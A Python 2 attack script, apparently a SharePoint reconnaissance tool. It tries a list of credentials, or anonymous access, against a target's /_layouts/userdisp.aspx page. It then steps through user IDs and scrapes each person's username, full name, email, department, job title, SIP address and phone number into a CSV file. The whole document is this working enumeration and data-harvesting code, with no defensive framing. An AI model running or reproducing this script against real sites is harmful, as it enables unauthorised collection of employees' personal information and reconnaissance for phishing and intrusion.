import json
import re
import requests
import socket
import sys
from requests_ntlm import HttpNtlmAuth
from urlparse import urlsplit

with open('target_url.txt') as target_list:
    urls = target_list.read().splitlines()
with open('path_list.txt') as path_list:
    paths = path_list.read().splitlines()
users = json.load(open("user_list.txt",'r'))

# get user rights regarding the path
def get_user(url,path):
    max_i = 10
    if len(sys.argv) > 2:
        max_i = int(sys.argv[2])
    for user in users['users']:
        print "[+] Checking", user['username'] ,"user rights"
        s = requests.Session()
        if user['username'] != "anonymous":
            s.auth = HttpNtlmAuth(user['username'], user['password'], s)
        r = s.get(url+path)
        if r.status_code == 200 and (r.text.find("SharePointError") == -1):
            print '\t', r.status_code, user['username'], path
            for i in range(1,max_i):
                id_u=username=name=email=departement=job=SIP=phone= "";
                r = s.get(url+"/_layouts/userdisp.aspx?id="+str(i),allow_redirects=False)
                if r.status_code == 200 and (r.text.find("SharePointError") == -1):
                    print "Find user :", '?id='+str(i)
                    id_u = i
                    # username
                    matches = re.search(r"FieldInternalName=\"Name\".*\n.*\n.*\n\s+([^&]+).*", r.text, re.IGNORECASE)
                    if matches:
                        m = re.search(r"([^\n\r]*)", matches.group(1))
                        print "Username:", m.group(0)
                        username = m.group(0)
                    # name
                    matches = re.search(r'FieldInternalName="Title".*\n.*\n.*\n\s+([^&]+).*', r.text, re.IGNORECASE)
                    if matches:
                        m = re.search(r"(^[a-z-A-Z ]+)", matches.group(1))
                        print "Name:", m.group(0)
                        name = m.group(0)
                    # mail
                    matches = re.search(r'FieldInternalName="EMail".*\n.*\n.*\n\s+\<a href=\"mailto:([^"]+)', r.text, re.IGNORECASE)
                    if matches:
                        print "Email:", matches.group(1)
                        email = matches.group(1)
                    # department
                    matches = re.search(r'FieldInternalName="Department".*\n.*\n.*\n\s+([^&]+)', r.text, re.IGNORECASE)
                    if matches:
                        m = re.search(r"([^\n\r]*)", matches.group(1))
                        print "Departement:",m.group(1)
                        departement = m.group(1)
                    # title
                    matches = re.search(r'FieldInternalName="JobTitle".*\n.*\n.*\n\s+([^&]+).', r.text, re.IGNORECASE)
                    if matches:
                        m = re.search(r"([^\n\r]*)", matches.group(1))
                        print "Job Title:",m.group(1) 
                        job = m.group(1)                   
                    # SIP
                    matches = re.search(r'FieldInternalName="SipAddress".*\n.*\n.*\n\s+\<a href="mailto:([^"]+).*', r.text, re.IGNORECASE)
                    if matches:
                        print "SIP:", matches.group(1)
                        SIP = matches.group(1)
                    # phone
                    matches = re.search(r'FieldInternalName="WorkPhone".*\n.*\n.*\n\s+\<span dir="ltr"\>([^\<]+)?', r.text, re.IGNORECASE)
                    if matches:
                        print "Phone:", matches.group(1)
                        phone = matches.group(1)
                    print ''
                    with open(urlsplit(sys.argv[1]).netloc+'.csv', 'a') as report:
                        report.write(str(id_u)+","+str(username)+","+str(name)+","+str(email)+","+str(departement)+","+str(job)+","+str(SIP)+","+str(phone)+"\n")
                elif r.text.find("SharePointError") != -1:
                    break
            break

if len(sys.argv) > 1:
    with open(urlsplit(sys.argv[1]).netloc+'.csv', 'a') as report:
        report.write("ID,Username,Name,Email,Departement,Job,SIP,Phone\n")
    get_user(sys.argv[1],"/_layouts/userdisp.aspx")
else:
    print "[-] Missing host : python get_user.py http://example.com max_id"
